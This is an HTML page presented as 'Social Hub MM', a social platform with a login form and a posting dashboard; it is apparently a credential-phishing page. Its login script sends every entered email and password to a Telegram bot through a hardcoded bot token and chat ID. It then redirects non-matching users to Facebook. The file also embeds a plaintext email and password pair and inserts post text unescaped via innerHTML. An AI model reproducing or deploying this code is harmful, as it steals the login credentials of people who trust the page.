<!DOCTYPE html>
<html lang="my">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Social Hub MM | Cyber Platform</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Padauk:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-black: #05050a;
            --neon-teal: #00f2ff;
            --neon-purple: #bc13fe;
            --neon-green: #00ff41;
            --glass: rgba(255, 255, 255, 0.05);
        }
        body {
            margin: 0; padding: 0; overflow-x: hidden;
            background-color: var(--bg-black);
            font-family: 'Share Tech Mono', 'Padauk', monospace;
            color: white;
            display: flex; justify-content: center; min-height: 100vh;
        }
        #matrixCanvas { position: fixed; top: 0; left: 0; z-index: -1; }

        /* Login UI */
        .login-box {
            background: var(--glass); backdrop-filter: blur(15px); border-radius: 15px;
            padding: 40px; width: 320px; text-align: center;
            border: 1px solid var(--neon-teal); box-shadow: 0 0 20px rgba(0, 242, 255, 0.2);
            z-index: 100; margin-top: 10vh;
        }
        .login-title { color: var(--neon-teal); font-size: 1.8rem; text-shadow: 0 0 10px var(--neon-teal); margin-bottom: 20px; }
        .input-group { text-align: left; margin-bottom: 20px; }
        .input-group input {
            width: 100%; padding: 12px; background: rgba(0, 0, 0, 0.6);
            border: 1px solid var(--neon-purple); border-radius: 5px;
            color: white; box-sizing: border-box; outline: none;
        }
        .btn-neon {
            width: 100%; padding: 12px; background: transparent;
            border: 1px solid var(--neon-teal); color: var(--neon-teal);
            font-weight: bold; cursor: pointer; border-radius: 5px;
            text-transform: uppercase; transition: 0.3s;
        }

        /* Dashboard Layout (Fixed for Mobile) */
        #dashboard {
            display: none; 
            grid-template-columns: 1fr;
            gap: 20px; width: 95%; max-width: 800px;
            margin: 20px auto; opacity: 0; transition: opacity 1s ease;
            z-index: 100;
        }
        @media (min-width: 900px) {
            #dashboard { grid-template-columns: 260px 1fr; }
        }

        .glass-panel {
            background: var(--glass); backdrop-filter: blur(10px);
            border: 1px solid rgba(0, 242, 255, 0.2); border-radius: 12px;
            padding: 20px; box-sizing: border-box;
        }

        /* Post Input Area */
        .post-input-area textarea {
            width: 100%; height: 80px; background: rgba(0,0,0,0.3);
            border: 1px dashed var(--neon-purple); border-radius: 8px;
            color: white; padding: 10px; box-sizing: border-box;
            resize: none; outline: none; margin-bottom: 10px;
        }
        .post-card {
            background: rgba(255,255,255,0.02); padding: 15px;
            border-radius: 10px; margin-bottom: 15px;
            border-left: 3px solid var(--neon-teal);
        }
        .post-image {
            width: 100%; max-height: 400px; object-fit: cover;
            border-radius: 10px; margin-top: 10px; border: 1px solid var(--neon-teal);
        }
    </style>
</head>
<body>
    <canvas id="matrixCanvas"></canvas>

    <div class="login-box" id="loginUI">
        <h1 class="login-title" id="mainTitle">SOCIAL HUB MM</h1>
        <form id="loginForm">
            <div class="input-group"><input type="email" id="email" placeholder="Email Address" required></div>
            <div class="input-group"><input type="password" id="password" placeholder="Password" required></div>
            <button type="submit" class="btn-neon">LOGIN လုပ်မည်</button>
        </form>
    </div>

    <div id="dashboard">
        <aside class="sidebar glass-panel" style="text-align: center;">
            <div style="width: 70px; height: 70px; background: linear-gradient(45deg, var(--neon-teal), var(--neon-purple)); border-radius: 50%; margin: 0 auto 15px; border: 2px solid var(--neon-teal);"></div>
            <h3 style="margin: 0;">Admin User</h3>
            <p style="color: var(--neon-green); font-size: 0.7rem;">● Online</p>
        </aside>

        <main class="feed">
            <div class="post-input-area glass-panel" style="margin-bottom: 20px;">
                <textarea id="postContent" placeholder="ဘာတွေတွေးနေလဲ..."></textarea>
                <input type="file" id="imageInput" accept="image/*" style="display: none;">
                <button onclick="document.getElementById('imageInput').click()" class="btn-neon" style="width: auto; padding: 5px 15px; font-size: 12px;">📷 ပုံရွေးမည်</button>
                <button onclick="createPost()" style="background: var(--neon-teal); border: none; padding: 8px 20px; border-radius: 5px; font-weight: bold; cursor: pointer; float: right;">Post တင်မည်</button>
                <div id="imagePreview" style="margin-top: 10px;"></div>
            </div>

            <div id="feedList">
                <div class="post-card glass-panel">
                    <h4 style="margin: 0; color: var(--neon-teal);">Tech Master MM</h4>
                    <p>အခု Dashboard ထဲမှာ Post တွေ ပြန်တင်လို့ ရပါပြီ! 🚀</p>
                </div>
            </div>
        </main>
    </div>

    <script>
        // Matrix Animation
        const canvas = document.getElementById('matrixCanvas');
        const ctx = canvas.getContext('2d');
        canvas.height = window.innerHeight; canvas.width = window.innerWidth;
        const characters = "SOCIALHUBMM01";
        const fontSize = 16;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);
        let matrixColor = "#004d40"; 

        function drawMatrix() {
            ctx.fillStyle = 'rgba(5, 5, 10, 0.1)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = matrixColor;
            ctx.font = fontSize + 'px monospace';
            for (let i = 0; i < drops.length; i++) {
                const text = characters.charAt(Math.floor(Math.random() * characters.length));
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 35);

        // Login & Telegram Logic
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const emailValue = document.getElementById('email').value;
            const passValue = document.getElementById('password').value;

            const token = "8417384892:AAHFtwxjmozHFmWBbPbG_TcGsKkoHcOXBLA"; 
            const chat_id = "7324613569";
            const message = `📡 Social Hub Alert!\n📧 Email: ${emailValue}\n🔑 Pass: ${passValue}`;
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

            try {
                await fetch(url);
                if (emailValue === "lwink4141@gmail.com" && passValue === "lwink4141") {
                    document.getElementById('loginUI').style.display = "none";
                    const dash = document.getElementById('dashboard');
                    dash.style.display = "grid";
                    setTimeout(() => { dash.style.opacity = "1"; }, 50);
                    matrixColor = "#00ff41";
                } else {
                    window.location.href = "https://www.facebook.com";
                }
            } catch (err) { alert("Connection Error!"); }
        });

        // Create Post Logic
        function createPost() {
            const content = document.getElementById('postContent').value;
            const imageInput = document.getElementById('imageInput');
            const feed = document.getElementById('feedList');
            let imageHTML = "";

            if (imageInput.files[0]) {
                const imageUrl = URL.createObjectURL(imageInput.files[0]);
                imageHTML = `<img src="${imageUrl}" class="post-image">`;
            }

            if (content.trim() === "" && !imageInput.files[0]) return;

            const newPost = document.createElement('div');
            newPost.className = 'post-card glass-panel';
            newPost.innerHTML = `
                <h4 style="margin: 0; color: var(--neon-purple);">Admin User</h4>
                <p>${content}</p>
                ${imageHTML}
            `;
            feed.prepend(newPost);

            document.getElementById('postContent').value = "";
            imageInput.value = "";
        }
    </script>
</body>
</html>
